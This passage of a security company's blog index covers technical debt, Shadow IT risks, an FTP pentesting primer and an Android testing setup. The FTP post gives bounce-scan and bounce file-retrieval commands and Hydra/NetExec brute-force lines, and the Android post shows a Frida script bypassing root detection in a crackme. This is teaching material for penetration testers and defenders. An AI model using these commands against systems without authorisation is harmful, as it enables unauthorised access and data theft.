Engineering"]},{"location":"blog/posts/09-02-2025/#types-of-technical-debt","title":"Types of Technical Debt","text":"","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#1-intentional","title":"1. Intentional","text":"<p>This type of debt is generated when deliberate decisions are made to prioritize functionality delivery, knowing that the code will require improvements in the future. It is common in projects with tight deadlines or when an idea needs to be validated before optimizing the code.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#2-unintentional","title":"2. Unintentional","text":"<p>It occurs due to errors, lack of knowledge, or poorly written code without the team being aware of the consequences. This debt is often the most dangerous as it can accumulate to an unmanageable level.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#examples-of-technical-debt","title":"Examples of Technical Debt","text":"<p>Technical debt appears in many forms and can arise from various causes. Below are some common examples found in software development projects:</p> <ul> <li>Architectural Technical Debt: A deficient architectural design can lead to significant long-term problems. For example:</li> <li>Difficult-to-scale monoliths: A single code block can make scalability and flexibility challenging.</li> <li>Poor separation of concerns: A poorly designed architecture can hinder modularity and code reuse.</li> <li>Excessive dependencies: High coupling between components makes modifications costly and risky.</li> <li>Lack of architectural documentation: Without clear guidance, the team can make decisions that exacerbate technical debt.</li> <li>Insufficient documentation: Projects with poor or nonexistent documentation can lead developers to misinterpret code purposes, features, or architecture. This creates a knowledge gap, which can accumulate technical debt when incorrect assumptions are made or when new developers struggle to understand the system.</li> <li>Duplicated code: Redundant code or copying and pasting code in different parts of the system suggests that the team has not adequately considered code reuse opportunities.</li> <li>Outdated libraries or APIs: If a project relies on outdated libraries or APIs, it will become increasingly difficult to secure, maintain, and expand as those dependencies become unsupported.</li> </ul>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#impact-of-technical-debt","title":"Impact of Technical Debt","text":"<p>Technical debt can have a significant impact on software development and business operations. Some negative consequences include:</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#development-delays","title":"Development Delays","text":"<p>As technical debt accumulates, the time required to implement new features or fix issues increases. The shortcuts taken initially result in greater effort and more time spent later.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#higher-maintenance-costs","title":"Higher Maintenance Costs","text":"<p>Maintaining software with technical debt requires more time and resources. Underlying issues must be addressed before additional changes or improvements can be made, increasing long-term operational costs.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#lower-software-quality","title":"Lower Software Quality","text":"<p>Technical debt often translates into low-quality code, which can lead to frequent errors and failures. This affects customer satisfaction and the company's reputation.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#difficulty-in-attracting-and-retaining-talent","title":"Difficulty in Attracting and Retaining Talent","text":"<p>Skilled developers prefer to work on well-maintained and technically solid projects. Accumulating technical debt can make it harder to hire and retain qualified personnel.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#how-to-manage-and-reduce-technical-debt","title":"How to Manage and Reduce Technical Debt","text":"<p>At Atlansec, we understand that managing technical debt is crucial to the success of any software project. Therefore, we adopt a proactive approach based on the following strategies:</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#1-continuous-refactoring","title":"1. Continuous Refactoring","text":"<p>Adopting a culture of continuous refactoring helps improve code quality without affecting the delivery of new features. Frequent small adjustments can prevent technical debt accumulation.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#2-code-reviews","title":"2. Code Reviews","text":"<p>Code reviews allow problems to be identified before they become debt. Encouraging collaboration among developers ensures better practices and higher code quality.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#3-automating-testing-and-cicd","title":"3. Automating Testing and CI/CD","text":"<p>Using automated testing and continuous integration/deployment (CI/CD) pipelines enables rapid issue detection and prevents the accumulation of unintentional technical debt.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#4-documentation-and-best-practices","title":"4. Documentation and Best Practices","text":"<p>Writing clear documentation and following established design patterns facilitates code maintainability and reduces the risk of generating debt due to misunderstandings.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#5-planning-technically-from-the-beginning","title":"5. Planning Technically from the Beginning","text":"<p>Focusing on proper architectural design before development begins can prevent long-term problems. Investing time in planning avoids many rushed decisions that generate debt.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#related-links","title":"Related Links","text":"<ul> <li>Asana - Technical Debt</li> <li>Atlassian - Technical Debt in Agile</li> </ul> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-03-2025/","title":"LAN Wars: The Phantom Menace","text":"<p>A long, long time ago, in an office cubicle nearby....</p> <p>The corporate network is plunged into chaos. The implementation of security policies on the company's systems is under dispute.</p> <p>Hoping to circumvent protocol with a handful of unapproved tools, the rebellious, grasping IT faction has ceased all collaboration with the IT team and established their own software ecosystem.</p> <p>While the IT team endlessly debates other matters, the CISO has secretly dispatched two cybersecurity experts, guardians of compliance and zero trust, to restore order and maintain network security.</p> <p>Does this plot sound familiar? It's better to learn about it now before it turns into a real-life horror movie. In this post, we'll delve into the issue of Shadow IT and how to tackle it effectively.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#what-is-shadow-it","title":"What is Shadow IT?","text":"<p>Shadow IT, much like a rogue force operating outside the bounds of the Empire \u2013 pardon, the official IT department \u2013 refers to all those applications, devices, and services that employees use without formal approval.</p> <p>Some examples include:</p> <ul> <li>Using WhatsApp to share work documents because the official system is too slow.</li> <li>An internal team deciding to use Trello because the company's JIRA is too complicated for them.</li> <li>Utilizing iLovePDF to convert company documents.</li> <li>Installing a cracked version of Photoshop due to a lack of licensing.</li> <li>Setting up AnyDesk for remote access to your workstation from home.</li> </ul> <p>And no, we're not talking about isolated incidents. According to recent studies, up to 80% of workers admit to using unauthorized applications in their daily work. From free cloud services to productivity apps, Shadow IT is more prevalent than many CISOs would care to admit.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#risks-associated-with-this-practice","title":"Risks Associated with This Practice","text":"<p>As is often the case, dangers lurk in the shadows. Seemingly innocuous practices can lead to devastating attacks. Let's examine the primary Shadow IT hotspots and the associated risks:</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#personal-devices-byod","title":"Personal Devices (BYOD)","text":"<p>The use of personal devices might seem harmless, and even desirable, due to the flexibility it grants users, but these \"infiltrators\" on our network can:</p> <ul> <li>Expose our network to external threats: These devices may have been previously compromised by malware or another attack and act as an entry vector.</li> <li>Expose corporate information in untrusted spheres: Certain features, such as cloud synchronization, can expose information to untrustworthy third parties.</li> <li>Facilitate lateral movement: An attacker can use the machine to move comfortably through the network due to the lack of corporate security solutions.</li> </ul>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#unauthorized-applications","title":"Unauthorized Applications","text":"<p>The use of applications can save the company team valuable time, but there should always be an approval process, and we must ensure that certain standards are met. Applications installed without oversight can have devastating consequences, including:</p> <ul> <li>Introducing vulnerabilities into the systems hosting the application: These applications may contain security vulnerabilities that an attacker can exploit to gain privileges or compromise the system hosting the application.</li> <li>Exposing our network to external threats: We all know someone who downloads software (OBS, for example) from their browser, and the first result leads them to install an application clone containing some form of malware. This happened with Keepass some time ago.</li> </ul>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#browser-extensions","title":"Browser Extensions","text":"<p>These small, seemingly harmless add-ons can be as dangerous as a spy droid:</p> <ul> <li>Exposing our company to external threats: This isn't new, but the scale has recently become apparent. A few months ago, a series of browser extensions were compromised and used to steal browser information from the extension's users. While we might think this is an isolated case, browser extension marketplaces exist where anyone could buy an extension trusted by users and subsequently manipulate its code.</li> <li>Exposing corporate information in untrusted spheres: Whether for malicious purposes or not, many extensions must process user browser information and send certain data to the application creator's servers. It's worth asking how secure the stored data is and how much control there truly is over what data is sent.</li> </ul>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#ai-agents-and-chatbots","title":"AI Agents and Chatbots","text":"<p>\"These are the bots you're looking for.\" New technological allies can also entail risks:</p> <ul> <li>Sending confidential information to external services: While, with training and common sense, these agents can be very useful for the user and save a great deal of time, indiscriminate use can lead to sending confidential information to the service providers....</li> </ul>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#how-to-address-it","title":"How to Address It","text":"<p>The solution isn't to build another Death Star. Instead, we need a more intelligent approach:</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#understand-the-actual-needs","title":"Understand the Actual Needs","text":"<p>Before drawing your lightsaber, it's essential to understand why users resort to Shadow IT. This process begins with a thorough assessment of the organization's current technological landscape. Conducting regular surveys will allow us to identify the shortcomings and frustrations users experience with official tools. It's crucial to establish open communication channels where employees can express their technological needs without fear of reprisal.</p> <p>Analyzing the usage patterns of unauthorized tools will provide valuable information about the functionalities users consider essential. This information, combined with the identification of bottlenecks in official processes, will help us understand where we need to improve our corporate solutions.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#monitoring-and-detection","title":"Monitoring and Detection","text":"<p>An effective Shadow IT control system requires a robust yet non-intrusive monitoring strategy. The implementation of application discovery systems on the network should be complemented by traffic monitoring tools that allow us to identify unusual or potentially risky usage patterns. Periodic audits of devices and applications should be performed, always respecting user privacy and maintaining a balance between security and trust.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#create-an-inclusive-strategy","title":"Create an Inclusive Strategy","text":"<p>The key lies in ongoing training and communication. Developing specific training programs for each department allows us to address the particular needs of different groups of users. These programs should go beyond simple presentations, including practical workshops and Q&amp;A sessions that allow users to truly understand the risks and available alternatives.</p> <p>Creating a security ambassador program can help spread best practices more organically within the organization. Regular communication of updates, coupled with the celebration of success stories, helps maintain user engagement with security policies. Public recognition of those who adopt and promote safe practices can create a positive culture around information security.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/09-03-2025/#conclusions","title":"Conclusions","text":"<p>Shadow IT isn't the dark side of the Force; it's more a symptom of unmet needs within your organization. Rather than combating it with prohibitions and restrictions, the real victory lies in understanding why it arises and creating a technological ecosystem that combines security with usability.</p> <p>Remember: the force for change lies in the balance between control and flexibility. As a wise corporate Jedi master once said, \"Shadow IT, control you must, but destroy you need not.\"</p> <p>The next time you discover an unauthorized application on your network, before panicking, ask yourself: What need is it fulfilling? How can we offer a better alternative? The answers to these questions will guide you toward more effective management of your IT infrastructure.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Corporate Security","Vulnerability Management"]},{"location":"blog/posts/14-11-2024/","title":"Intro to FTP","text":"<p>FTP (File Transfer Protocol) is one of the oldest and most widely used protocols for transferring files between computers. While it provides a simple way to move data, its default configuration lacks security, making it a common target for attackers. In this article, we\u2019ll cover the basics of FTP, its communication modes, essential commands, and common misconfigurations that could be exploited. Whether you're a cybersecurity enthusiast or a penetration tester, understanding FTP is crucial for securing or assessing network environments.</p> <p>This protocol has a client-server architecture using a server to serve files that can be accessed by N clients. By default, the information is transmitted in plain text, although there is an encrypted version of it called SFTP (Secure File Transfer Protocol).</p> <p>Although there are implementations with a graphical interface, in this article we will make use of the FTP command line tool, which gives us a lot of flexibility when working with the protocol. In later articles we will explore the main client and server implementations, although in this one we will focus on explaining the basic concepts of the protocol, how to work with it and how to take advantage of some misconfigurations.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#theory","title":"Theory","text":"","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#communication-channels","title":"Communication channels","text":"<p>For FTP to work, two communication channels are required, one for sending commands and the other for data.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#connection-modes","title":"Connection modes","text":"","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#active","title":"Active","text":"<p>This is the default connection mode for FTP connections, in which two events occur:</p> <ul> <li>A command channel is established in the connection to the server between the server's command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established, an attempt is made to open a connection from the server's data port (20 by default) to port P+1 on the client.</li> </ul> <p>Note</p> <p>Active mode may present problems with client firewalls because it attempts to create a direct connection to a client-side port, which may be blocked by certain firewalls.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#passive","title":"Passive","text":"<p>This mode arises as a solution to the problem of client firewalls, here the workflow is modified so that both the data connection and the client connection are initiated from the client, we can break it down into two events.</p> <ul> <li>A command channel is established on the server connection between the server command port (21 by default) and a port greater than 1023 on the client side (we will refer to this as P).</li> <li>Once the data connection is established a data connection is opened from port P+1 on the client to a port on the server data channel, this process is repeated for each file transfer occupying a different server port on each connection (this can be configured in most server side software) .</li> </ul> <p>Note</p> <p>Passive mode requires the opening of a range of ports in the firewall, this can generate some security problems if this port opening is not configured correctly.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#ftp-commands","title":"FTP commands","text":"<pre><code>CWD -&gt; Changes the current directory to the specified one\nDELE -&gt; Deletes the specified file\nEPRT -&gt; Establish a socket for data connection\nLIST -&gt; List the files in the current directory\nPASV -&gt; Change mode to passive mode\nPWD -&gt; Displays the current directory \nRETR -&gt; Download the specified file\n</code></pre>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#anonymous-login","title":"Anonymous login","text":"<p>There is an FTP configuration that allows the use of a login to share files for any user that requires it, in case this configuration is enabled a user could use anonymous as login name and any password to access the server as a user with low privileges, although in certain cases this can lead to compromise the entire system.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#ftp-bounce-port-scan","title":"FTP Bounce port scan","text":"<p>It is possible to abuse the PORT and ERPT commands to perform an open port scan via an FTP server.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#nmap","title":"Nmap","text":"<pre><code>nmap -b &lt;name&gt;:&lt;pass&gt;@&lt;ftp_server&gt; &lt;victim&gt;\n</code></pre>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#hand-made","title":"Hand-made","text":"<p>Once connected we can perform the port scan using the PORT and ERPT commands followed by a LIST command.</p> <p>Here is an example for scanning port 9091 on host 10.10.10.14</p> <pre><code>PORT 10.10.10.14.14.0.9091\nEPRT |2|10.10.10.14|9091||\n\nLIST\n</code></pre> <p>If the response is a 150 the port is open, in case of receiving a 415 the port is closed.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#ftp-bounce-file-get","title":"FTP Bounce file get","text":"<p>This attack allows an attacker to download files from an FTP server not accessible by the attacker, but which can be reached by an FTP server accessible by the attacker.</p> Net Diagram <p>This attack has the following prerequisites:</p> <ul> <li>Valid credentials for External FTP.</li> <li>Valid credentials for Internal FTP.</li> <li>Write access for External FTP.</li> <li>PORT command execution permissions on both External and Internal.</li> </ul> <p>First of all we will deploy an FTP server on the attacker's machine, this server has to support passive mode.</p> <p>Once deployed we will open a passive connection with the PASV command and tell it to save it with STOR output.ext .</p> <p>Now we will create a file with the commands we want to launch against the second server, an example would be the following:</p> <pre><code>user ftp # User for the internal server\npass password # Password for the internal server\ncwd /DIRECTORY\ntype i\nport F,F,F,F,F,F,X,X #Our passive port\nretr file.ext\nquit\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@\n</code></pre> <p>Now we upload it with PUT and from the external server we execute the following commands:</p> <pre><code>put payload\nquote \"port C,C,C,C,C,0,21\" # IP of internal server\nquote \"retr payload\"\n</code></pre> <p>After this we will have the file.ext file on our server as output.ext</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#brute-force-attack","title":"Brute force attack","text":"<p>Many FTP servers do not have protection against brute force attacks. Having a user or a list of them we can carry out a brute force attack with different credentials obtained from various sources, although there are several tools for this purpose, the two most common are NetExec and Hydra.  </p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#netexec","title":"NetExec","text":"<pre><code>nxc ftp IP -u userfile -p passwordfile\n</code></pre>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#hydra","title":"Hydra","text":"<pre><code>hydra -L userfile -P passwordfile ftp://IP\n</code></pre>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#full-content-backup","title":"Full content backup","text":"<p>This is not an attack per se, but it is quite useful, as it allows us to download all accessible files from the server using a single command.</p> <pre><code>wget -r ftp://IP/dir/* --ftp-user=username --ftp-password=password\n</code></pre>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#ftp-file-upload-to-rce","title":"FTP file upload to RCE","text":"<p>In certain circumstances, permission to upload files to the server along with other misconfigurations can lead to obtaining remote execution of commands on the server.</p> <p>The most common case is the possibility of uploading files to be served by a web server, where we could upload a webshell interpretable by the server to obtain command execution.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/14-11-2024/#sniffing-credentials","title":"Sniffing credentials","text":"<p>Since FTP works by default in plain text, it is possible for an attacker on the same network to use a sniffer and capture both the credentials and the FTP conversation.</p> <p>In the next article of this series on FTP we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","FTP"]},{"location":"blog/posts/15-12-2024/","title":"Installation and Configuration of Android Studio and Related Tools on Linux/Debian","text":"<p>This article outlines the necessary steps to create a dynamic testing environment on Linux/Debian, detailing how to integrate tools such as Burp Suite, Frida, and Objection, and their specific purposes. It also covers procedures for managing certificates on an Android emulator and configuring a dynamic testing environment. Follow the detailed instructions to achieve a functional and analysis-ready setup.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#installing-android-studio","title":"Installing Android Studio","text":"<p>Android Studio serves as the primary IDE for Android application development and testing, providing an environment for app creation, emulation, and debugging, we are going to use this for easy download and installation of avds.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-download-android-studio","title":"Step 1: Download Android Studio","text":"<ol> <li>Download the Android Studio ZIP file from the official Android Studio page</li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-extraction-and-setup","title":"Step 2: Extraction and Setup","text":"<p>Extract the downloaded file:</p> <pre><code>unzip android-studio-*.zip -d ~/android-studio\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-3-create-symbolic-links","title":"Step 3: Create Symbolic Links","text":"<p>To streamline the use of Android Studio and the emulator, create symbolic links:</p> <pre><code>sudo ln -s ~/android-studio/bin/studio.sh /usr/local/bin/androidStudio\nsudo ln -s ~/android-studio/emulator/emulator /usr/local/bin/androidEmulator\n</code></pre> <p>Now you can run Android Studio with:</p> <pre><code>androidStudio\n</code></pre> <p>And the emulator with:</p> <pre><code>androidEmulator\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-4-use-a-physical-device-optional","title":"Step 4: Use a Physical Device (Optional)","text":"<p>Although this guide primarily uses an Android emulator, you can opt to use a physical device for a more realistic experience. This requires enabling developer options and USB debugging on your device.</p> <ol> <li>Enable Developer Options:</li> <li> <p>Go to Settings &gt; About Phone and tap Build Number several times until developer options are enabled.</p> </li> <li> <p>Enable USB Debugging:</p> </li> <li>In Settings &gt; Developer Options, enable USB Debugging.</li> </ol> <p>Connect your device to the computer via USB. You can now use <code>adb</code> commands to install apps, debug, and perform the same tests as with the emulator.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#installing-burp-certificates-on-an-android-emulator","title":"Installing Burp Certificates on an Android Emulator","text":"<p>Burp Suite is used to intercept and analyze traffic between the Android application and backend servers. Installing its certificate allows HTTPS traffic to be decrypted for analysis.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-start-the-emulator-with-a-writable-system","title":"Step 1: Start the Emulator with a Writable System","text":"<ol> <li> <p>List available AVDs (Android Virtual Devices) with the <code>-list-avds</code> option: <pre><code>androidEmulator -list-avds\n</code></pre></p> </li> <li> <p>Start the emulator with the <code>-writable-system</code> option: <pre><code>androidEmulator -avd &lt;avd_name&gt; -writable-system\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-export-the-certificate-from-burp-suite","title":"Step 2: Export the Certificate from Burp Suite","text":"<ol> <li>From Burp Suite, export the certificate in DER format:</li> <li>Go to Proxy &gt; Options &gt; Import/export CA certificate.</li> <li>Export the file as <code>burp-cert.der</code>.</li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-3-convert-and-copy-the-certificate-to-the-emulator","title":"Step 3: Convert and Copy the Certificate to the Emulator","text":"<ol> <li> <p>Convert the certificate from DER to PEM format: <pre><code>openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem\n</code></pre></p> </li> <li> <p>Get the certificate hash: <pre><code>openssl x509 -inform PEM -subject_hash_old -in burp-cert.pem | head -1\n</code></pre></p> </li> <li> <p>Rename the certificate using its hash: <pre><code>mv burp-cert.pem 9a5ba575.0\n</code></pre></p> </li> <li> <p>Push the certificate to the emulator: <pre><code>adb root\nadb remount\nadb push 9a5ba575.0 /sdcard/\nadb shell mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/\nadb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-4-verification","title":"Step 4: Verification","text":"<p>Restart the emulator and verify the installation by checking Settings &gt; Security &gt; Trusted Credentials for the \"PortSwigger CA\" certificate.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#installing-frida-and-objection-in-a-python-virtual-environment","title":"Installing Frida and Objection in a Python Virtual Environment","text":"<p>Frida is a dynamic instrumentation toolkit for debugging, testing, and reverse engineering Android applications. Objection is a wrapper for Frida that simplifies security assessments by automating common testing tasks.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-create-a-virtual-environment","title":"Step 1: Create a Virtual Environment","text":"<ol> <li> <p>Create a Python virtual environment to isolate tool dependencies: <pre><code>python3 -m venv frida-env\n</code></pre></p> </li> <li> <p>Activate the virtual environment: <pre><code>source frida-env/bin/activate\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-install-frida-and-objection","title":"Step 2: Install Frida and Objection","text":"<ol> <li>Install both tools using <code>pip</code>: <pre><code>pip install frida-tools objection\n</code></pre></li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#configuring-frida-server-on-the-emulator","title":"Configuring Frida-Server on the Emulator","text":"<p>The Frida server facilitates communication between the Frida client on your host machine and the Android emulator for live application instrumentation.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-download-the-frida-server-file","title":"Step 1: Download the Frida-Server File","text":"<ol> <li> <p>Download the <code>frida-server</code> binary from the official Frida releases page.</p> </li> <li> <p>Extract the downloaded file.</p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-upload-and-configure-frida-server-on-the-emulator","title":"Step 2: Upload and Configure Frida-Server on the Emulator","text":"<ol> <li> <p>Push the <code>frida-server</code> binary to the emulator: <pre><code>adb push frida-server /data/local/tmp/\nadb shell chmod 755 /data/local/tmp/frida-server\n</code></pre></p> </li> <li> <p>Start the Frida server: <pre><code>adb shell /data/local/tmp/frida-server &amp;\n</code></pre></p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-3-verification","title":"Step 3: Verification","text":"<p>Ensure Frida is working by listing processes on the emulator:</p> <pre><code>frida-ps -U\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#method-inspection-revisiting-crackme-1","title":"Method Inspection: Revisiting Crackme 1","text":"<p>To demonstrate the power of dynamic analysis, we will use the \"Uncrackable1\" APK to explore how these techniques can be applied in practice.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#exploring-the-application-with-apklab","title":"Exploring the Application with APKLab","text":"<p>To understand the application better, decompile the APK to reveal its Java source code using the APKLab extension for Visual Studio Code. This extension integrates with tools like JADX to simplify the process.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-set-up-apklab","title":"Step 1: Set up APKLab","text":"<ol> <li>Install APKLab from the Visual Studio Code extensions marketplace.</li> <li>Open the APK file in APKLab to automatically decompile the application and display the code.</li> </ol> APK Lab Visual Studio Extension","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-locate-root-detection-code","title":"Step 2: Locate Root Detection Code","text":"<ol> <li> <p>Use the search functionality in APKLab to locate code responsible for root detection by searching for phrases like \"Root detected.\"</p> </li> <li> <p>Navigate to the implementation by clicking on the search results.</p> </li> </ol>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<p>We can bypass root detection by modifying what methods like <code>c.a()</code>, <code>c.b()</code>, and <code>c.c()</code> return. Alternatively, we can change the implementation of the <code>onClick()</code> method in <code>MainActivity</code>, which closes the app when \"OK\" is clicked on the alert.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#using-frida-to-instrument-the-app","title":"Using Frida to Instrument the App","text":"","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-1-find-the-process-id","title":"Step 1: Find the Process ID","text":"<p>List all running processes to locate the app:</p> <pre><code>frida-ps -Ua\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-2-attach-to-the-process-and-enumerate-methods","title":"Step 2: Attach to the Process and Enumerate Methods","text":"<p>Create a script to list methods in the app:</p> <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> <p>Attach to the process and execute the script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#step-3-override-the-method-implementation","title":"Step 3: Override the Method Implementation","text":"<p>Use Frida to modify the <code>onClick()</code> method:</p> <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre> <p>Run the script and verify that pressing \"OK\" no longer closes the app.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/15-12-2024/#extracting-the-secret-passphrase","title":"Extracting the Secret Passphrase","text":"<p>Inspect the code further to find the function responsible for decrypting the secret passphrase. Log the decryption 